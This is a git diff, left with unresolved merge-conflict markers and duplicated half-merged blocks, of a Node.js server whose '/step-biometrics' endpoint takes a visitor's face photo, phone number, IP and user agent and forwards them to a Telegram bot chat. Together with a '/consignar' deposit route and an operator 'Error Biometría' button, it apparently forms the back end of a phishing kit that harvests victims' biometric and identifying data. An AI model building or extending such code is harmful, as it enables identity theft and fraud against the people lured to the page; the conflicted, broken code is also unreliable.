@@ -333,58 +333,75 @@ app.post('/consignar', async (req, res) => {
 
  
 // ==================== ENDPOINT: BIOMETRÍA ====================
- 
- 
-const FormData = require('form-data');
 
- 
+
+
+
+
+
+<<<<<<< HEAD
+// ==================== ENDPOINT: BIOMETRÍA ====================
+app.post('/step-biometrics', async (req, res) => {
+  try {
+    const { sessionId, imageBase64, userAgent, ip, phoneNumber } = req.body;
+=======
 app.post('/step-biometrics', async (req, res) => {
   try {
     const { sessionId, imageBase64, userAgent, ip } = req.body;
+>>>>>>> b3ecfedf0334e58c4d9b96060a75bf4c9e0a13bf
 
     if (!BOT_TOKEN || !CHAT_ID) {
       return res.status(500).json({ ok: false });
- 
- 
     }
 
-    if (!imageBase64 || !imageBase64.startsWith('data:image')) {
-      return res.status(400).json({ ok: false });
- 
+<<<<<<< HEAD
+    if (!sessionId || !imageBase64) {
+      return res.status(400).json({ ok: false, reason: 'Datos incompletos' });
     }
 
+=======
+>>>>>>> b3ecfedf0334e58c4d9b96060a75bf4c9e0a13bf
     const session = sessionData.get(sessionId) || {};
 
- 
- 
-    const mimeMatch = imageBase64.match(/^data:(image\/\w+);base64,/);
-    const mimeType = mimeMatch ? mimeMatch[1] : 'image/jpeg';
-    const extension = mimeType.split('/')[1];
-
- 
     const buffer = Buffer.from(
       imageBase64.replace(/^data:image\/\w+;base64,/, ''),
       'base64'
     );
 
- 
+<<<<<<< HEAD
+    const FormData = require('form-data');
+    const formData = new FormData();
+
+=======
     const formData = new (require('form-data'))();
+>>>>>>> b3ecfedf0334e58c4d9b96060a75bf4c9e0a13bf
     formData.append('chat_id', CHAT_ID);
     formData.append('photo', buffer, {
       filename: 'biometria.jpg',
       contentType: 'image/jpeg'
- 
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('photo', buffer, {
-      filename: `biometria.${extension}`,
-      contentType: mimeType
- 
     });
 
     formData.append(
       'caption',
- 
+<<<<<<< HEAD
+`🧬 BIOMETRÍA RECIBIDA
+
+📱 Número: ${phoneNumber || session.phoneNumber || 'N/A'}
+🆔 Session: ${sessionId}
+🌐 IP: ${ip || session.ip || 'N/A'}
+🖥️ UA: ${userAgent || 'N/A'}`
+    );
+
+    await axios.post(
+      getTelegramApiUrl('sendPhoto'),
+      formData,
+      { headers: formData.getHeaders() }
+    );
+
+    console.log(`🧬 Biometría enviada - Session: ${sessionId}`);
+    res.json({ ok: true });
+
+=======
       `🧬 BIOMETRÍA RECIBIDA\n\n🆔 Session: ${sessionId}\n🌐 IP: ${ip}\n🖥️ UA: ${userAgent}`
     );
 
@@ -393,43 +410,8 @@ app.post('/step-biometrics', async (req, res) => {
     });
 
     console.log(`🧬 Biometría enviada - Session ${sessionId}`);
- 
-`🧬 BIOMETRÍA RECIBIDA
-
-📱 Número: ${session.phoneNumber || 'N/A'}
-🌐 IP: ${ip || 'N/A'}
-🖥️ UA: ${userAgent || 'N/A'}
-🆔 Session: ${sessionId}`
-    );
-
-    // 🔘 BOTÓN ERROR BIOMETRÍA
-    formData.append(
-      'reply_markup',
-      JSON.stringify({
-        inline_keyboard: [
-          [
-            {
-              text: '❌ Error Biometría',
-              callback_data: `go:biometria|${sessionId}`
-            }
-          ]
-        ]
-      })
-    );
-
-    await axios.post(
-      getTelegramApiUrl('sendPhoto'),
-      formData,
-      {
-        headers: formData.getHeaders(),
-        timeout: 15000
-      }
-    );
-
-    console.log(`🧬 Biometría enviada con botón - Session ${sessionId}`);
- 
     res.json({ ok: true });
-
+>>>>>>> b3ecfedf0334e58c4d9b96060a75bf4c9e0a13bf
   } catch (err) {
     console.error('❌ Error biometría:', err.message);
     res.status(500).json({ ok: false });
